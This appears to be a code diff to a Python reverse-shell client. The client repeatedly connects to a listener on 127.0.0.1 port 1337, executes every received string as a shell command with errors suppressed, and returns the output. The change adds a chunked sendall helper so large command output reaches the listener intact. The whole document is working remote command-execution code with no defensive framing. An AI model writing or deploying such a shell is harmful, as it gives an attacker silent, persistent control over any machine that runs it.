@@ -53,13 +53,21 @@ from socket import socket
 from contextlib import suppress
 from subprocess import run, PIPE
 
+def sendall(data):
+    chunk = data[:30000]
+    data = data[30000:]
+    while chunk:
+        s.sendall(chunk)
+        chunk = data[:30000]
+        data = data[30000:]
+
 while True:
     with suppress(Exception):
         s = socket()
         s.connect(("127.0.0.1", 1337))
         data = b" "
         while True:
-            s.send(data)
+            sendall(data)
             data = s.recv(65535).decode()
             p = run(data, shell=True, stdout=PIPE, stderr=PIPE)
             data = p.stdout or p.stderr or b" "
